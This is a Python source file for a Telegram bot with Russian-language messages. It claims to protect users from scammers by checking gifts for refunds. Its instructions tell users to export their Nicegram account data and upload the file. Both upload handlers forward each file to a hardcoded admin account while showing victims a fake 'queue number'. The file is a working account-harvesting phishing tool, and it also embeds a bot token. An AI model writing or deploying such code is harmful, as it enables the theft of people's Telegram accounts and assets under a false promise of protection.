import asyncio
import logging
import sqlite3
from pathlib import Path
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InputFile, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import sys
import datetime
import aiohttp
import json

# Конфигурация
TOKEN = "8386031733:AAHU7CxXWA34nkPI7gH_uMlTI-iMy7BET60"  # Ваш токен
ADMIN_ID = 7225974704  # ID администратора
WEBAPP_URL = "https://ng-web-liart.vercel.app"  # URL вашего WebApp


# Создаем роутер
router = Router()
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Состояния FSM
class AdminStates(StatesGroup):
    waiting_for_queue_number = State()

class SupportStates(StatesGroup):
    waiting_for_support_message = State()

# Хранилище для message_id сообщений поддержки
support_messages = {}

# Инициализация базы данных
def init_database():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Создаем таблицу пользователей
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        first_seen DATETIME,
        last_seen DATETIME
    )
    ''')
    
    conn.commit()
    conn.close()

# Проверка первого входа пользователя
def check_first_time_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    
    is_first_time = user is None
    
    conn.close()
    return is_first_time

# Добавление нового пользователя в базу данных
def add_new_user(user_id, username, first_name):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    cursor.execute('''
    INSERT INTO users (user_id, username, first_name, first_seen, last_seen)
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, now, now))
    
    conn.commit()
    conn.close()
    return True

# Обновление времени последнего входа
def update_last_seen(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    cursor.execute('''
    UPDATE users SET last_seen = ? WHERE user_id = ?
    ''', (now, user_id))
    
    conn.commit()
    conn.close()

# Функция для отправки первого запуска администратору
async def send_first_start_to_admin(user_id: int, username: str, first_name: str):
    try:
        await bot.send_message(
            ADMIN_ID,
            f"👤 <b>ПЕРВЫЙ ЗАПУСК бота новым пользователем</b>\n\n"
            f"🆕 <b>Новый пользователь:</b> @{username or 'нет'}\n"
            f"🆔 <b>ID:</b> {user_id}\n"
            f"👤 <b>Имя:</b> {first_name}\n"
            f"📅 <b>Дата:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    except Exception as e:
        print(f"Не удалось отправить сообщение администратору о первом запуске: {e}")

# Главное меню
def get_main_menu():
    keyboard = [
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton(text="📲 Скачать Nicegram", web_app={"url": "https://nicegram.app/"})],
        [InlineKeyboardButton(text="🔍 Проверка на рефаунд", web_app={"url": WEBAPP_URL})],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Клавиатура "Назад"
def get_back_keyboard():
    keyboard = [[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Клавиатура "Инструкция"
def get_instruction_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Клавиатура для админа
def get_admin_keyboard(user_id):
    keyboard = [[InlineKeyboardButton(text="📋 Поставить на очередь", callback_data=f"queue_{user_id}")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Клавиатура для поддержки
def get_support_keyboard():
    keyboard = [[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Стартовая команда
@router.message(CommandStart())
async def cmd_start(message: Message):
    user = message.from_user
    
    # Проверяем первый ли это запуск пользователя через БД
    is_first_time = check_first_time_user(user.id)
    
    if is_first_time:
        # Это первый запуск - отправляем администратору и добавляем в БД
        await send_first_start_to_admin(user.id, user.username, user.first_name)
        add_new_user(user.id, user.username, user.first_name)
    else:
        # Не первый запуск - просто обновляем время последнего входа
        update_last_seen(user.id)
    
    # Отправляем фото с сообщением
    photo_path = Path("1.png")
    if photo_path.exists():
        photo = FSInputFile("1.png")
        await message.answer_photo(
            photo=photo,
            caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
            reply_markup=get_main_menu()
        )
    else:
        await message.answer(
            """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
            reply_markup=get_main_menu()
        )

# Обработка инструкции
@router.callback_query(F.data == "instruction")
async def instruction_handler(callback: CallbackQuery):
    instruction_text = """<b>📖 Инструкция:</b>

1. Скачайте приложение Nicegram с официального сайта.
2. Откройте Nicegram и войдите в свой аккаунт.
3. Зайдите в настройки и выберите пункт «Nicegram».
4. Экспортируйте данные аккаунта.
5. В меню бота нажмите '🔍 Проверка на рефаунд'.
6. Отправьте файл боту."""
    
    # Редактируем сообщение с инструкцией (подменяем текущее сообщение)
    await callback.message.edit_caption(
        caption=instruction_text,
        reply_markup=get_instruction_keyboard()
    )
    await callback.answer()

# Обработка проверки на рефаунд
@router.callback_query(F.data == "check_refund")
async def check_refund_handler(callback: CallbackQuery):
    user = callback.from_user
    
    # Отправляем отдельное сообщение с просьбой отправить файл
    await callback.message.answer(
        "🗂 Отправьте файл формата .txt или .zip для проверки:",
        reply_markup=get_back_keyboard()
    )
    await callback.answer()

# Обработка поддержки
@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery, state: FSMContext):
    user = callback.from_user
    
    # Отправляем отдельное сообщение с инструкцией
    support_msg = await callback.message.answer(
        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение для поддержки. Мы ответим вам в ближайшее время.",
        reply_markup=get_back_keyboard()
    )
    
    # Сохраняем ID сообщения для последующего удаления
    support_messages[user.id] = support_msg.message_id
    
    # Устанавливаем состояние ожидания сообщения
    await state.set_state(SupportStates.waiting_for_support_message)
    await callback.answer()

# Обработка сообщений для поддержки
@router.message(SupportStates.waiting_for_support_message)
async def process_support_message(message: Message, state: FSMContext):
    user = message.from_user
    
    # Удаляем предыдущее сообщение с инструкцией о поддержке
    if user.id in support_messages:
        try:
            await bot.delete_message(chat_id=user.id, message_id=support_messages[user.id])
            del support_messages[user.id]
        except:
            pass
    
    # Отправляем пользователю сообщение о получении
    await message.answer(
        "✅ Ваше сообщение получено! Администратор скоро ответит.\n\nОбычное время ответа: 30 минут",
        reply_markup=get_support_keyboard()
    )
    
    # Сбрасываем состояние
    await state.clear()

# Обработка возврата в главное меню - ОБНОВЛЕННАЯ ВЕРСИЯ
@router.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: CallbackQuery):
    try:
        # Проверяем, есть ли у сообщения caption (фото с подписью)
        photo_path = Path("1.png")
        
        if hasattr(callback.message, 'caption') and callback.message.caption is not None:
            # Это сообщение с фото и подписью (например, инструкция)
            if photo_path.exists():
                # Подменяем фото и текст на главное меню
                await callback.message.edit_media(
                    media=InputFile("1.png"),
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                # Если фото нет, просто меняем текст
                await callback.message.edit_caption(
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
        else:
            # Это обычное текстовое сообщение
            if photo_path.exists():
                # Удаляем текстовое сообщение и отправляем новое с фото
                await callback.message.delete()
                photo = FSInputFile("1.png")
                await callback.message.answer_photo(
                    photo=photo,
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                # Если фото нет, просто меняем текст
                await callback.message.edit_text(
                    """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
    
    except Exception as e:
        # Если не удалось подменить, отправляем новое сообщение
        try:
            photo_path = Path("1.png")
            if photo_path.exists():
                photo = FSInputFile("1.png")
                await callback.message.answer_photo(
                    photo=photo,
                    caption="""Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
            else:
                await callback.message.answer(
                    """Привет! Я - Бот, который поможет тебе не попасться на мошенников. Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги.

Выбери действие:""",
                    reply_markup=get_main_menu()
                )
        except Exception as e2:
            print(f"Ошибка при отправке сообщения: {e2}")
    
    await callback.answer()


# Обработка данных из WebApp (файл загружен в WebApp и пришла ссылка)
@router.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    user = message.from_user
    raw = (message.web_app_data.data or "").strip()

    # Ожидаем JSON: {"file_url":"...", "file_name":"..."} либо просто строку-ссылку
    file_url = None
    file_name = None
    try:
        payload = json.loads(raw)
        if isinstance(payload, dict):
            file_url = payload.get("file_url") or payload.get("url") or payload.get("link")
            file_name = payload.get("file_name") or payload.get("name") or payload.get("filename")
    except Exception:
        payload = None

    if not file_url:
        # если raw сам выглядит как ссылка
        if raw.startswith("http://") or raw.startswith("https://"):
            file_url = raw

    if not file_url:
        await message.answer("❌ Не удалось получить ссылку на файл из WebApp. Попробуйте ещё раз.")
        return

    if not file_name:
        # запасной вариант имени
        file_name = "refund_check_file"

    await message.answer("✅ Файл получен. Отправляю на проверку. Ожидайте результата.")

    # Скачиваем файл по ссылке и отправляем админу как документ (НЕ ссылкой)
    tmp_dir = Path("tmp_downloads")
    tmp_dir.mkdir(exist_ok=True)
    safe_name = "".join(ch for ch in file_name if ch.isalnum() or ch in "._- ").strip() or "refund_check_file"
    tmp_path = tmp_dir / safe_name

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(file_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                resp.raise_for_status()
                with tmp_path.open("wb") as f:
                    while True:
                        chunk = await resp.content.read(1024 * 64)
                        if not chunk:
                            break
                        f.write(chunk)

        user_info = f"👤 Пользователь: @{user.username or 'нет'} (ID: {user.id})"
        await bot.send_document(
            ADMIN_ID,
            document=FSInputFile(tmp_path),
            caption=f"📥 <b>Бот получил файл (из WebApp)</b>\n{user_info}\n📄 <b>Имя файла:</b> {safe_name}",
            reply_markup=get_admin_keyboard(user.id)
        )
    except Exception as e:
        await message.answer("❌ Ошибка при скачивании/отправке файла. Попробуйте ещё раз позже.")
        try:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка WebApp-файла: {e}")
        except Exception:
            pass
    finally:
        try:
            if tmp_path.exists():
                tmp_path.unlink()
        except Exception:
            pass


# Обработка документов от пользователей
@router.message(F.document)
async def handle_document(message: Message):
    # Проверяем расширение файла
    file_name = message.document.file_name or ""
    if not file_name.lower().endswith(('.txt', '.zip')):
        await message.answer(
            "🤔 Это не похоже на файл проверки…",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")]]
            )
        )
        return
    
    user = message.from_user
    
    # Сообщаем пользователю
    await message.answer("✅ Файл отправлен на проверку. Ожидайте результата.")
    
    # Пересылаем файл администратору
    user_info = f"👤 Пользователь: @{user.username or 'нет'} (ID: {user.id})"
    await bot.send_document(
        ADMIN_ID,
        document=message.document.file_id,
        caption=f"📥 <b>Бот получил файл</b>\n{user_info}\n📄 <b>Имя файла:</b> {file_name}",
        reply_markup=get_admin_keyboard(user.id)
    )

# Обработка кнопки "Поставить на очередь" у админа
@router.callback_query(F.data.startswith("queue_"))
async def queue_handler(callback: CallbackQuery, state: FSMContext):
    # Проверяем, что это администратор
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Вы не администратор!", show_alert=True)
        return
    
    try:
        user_id = int(callback.data.split("_")[1])
    except ValueError:
        await callback.answer("❌ Ошибка: неверный формат данных", show_alert=True)
        return
    
    # Сохраняем user_id в состоянии
    await state.set_state(AdminStates.waiting_for_queue_number)
    await state.update_data(user_id=user_id)
    
    # Отправляем сообщение админу с запросом номера очереди
    await callback.message.answer(
        f"📝 <b>Постановка в очередь</b>\n\nНапишите номер очереди для пользователя {user_id}:"
    )
    
    await callback.answer()

# Обработка номера очереди от админа
@router.message(AdminStates.waiting_for_queue_number)
async def process_queue_number(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Вы не администратор!")
        return
    
    try:
        queue_num = int(message.text)
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")
        return
    
    # Получаем user_id из состояния
    data = await state.get_data()
    user_id = data.get('user_id')
    
    # Отправляем сообщение пользователю
    try:
        await bot.send_message(
            user_id,
            f"✅ Вы поставлены на проверку в очередь №{queue_num}"
        )
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить сообщение пользователю {user_id}")
        await state.clear()
        return
    
    # Сообщаем админу
    await message.answer(f"✅ Пользователь {user_id} поставлен в очередь №{queue_num}")
    
    # Сбрасываем состояние
    await state.clear()

# Обработка обычных сообщений (кроме документов)
@router.message()
async def handle_other_messages(message: Message):
    # Игнорируем сообщения от админа
    if message.from_user.id == ADMIN_ID:
        return

async def main():
    # Инициализируем базу данных
    init_database()
    
    dp.include_router(router)
    
    # Отправляем администратору сообщение о запуске бота
    try:
        await bot.send_message(ADMIN_ID, "🤖 <b>Бот запущен и готов к работе!</b>")
    except Exception as e:
        print(f"Не удалось отправить сообщение администратору о запуске: {e}")
    
    print("🤖 Бот запущен...")
    print("🗄️ База данных инициализирована")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())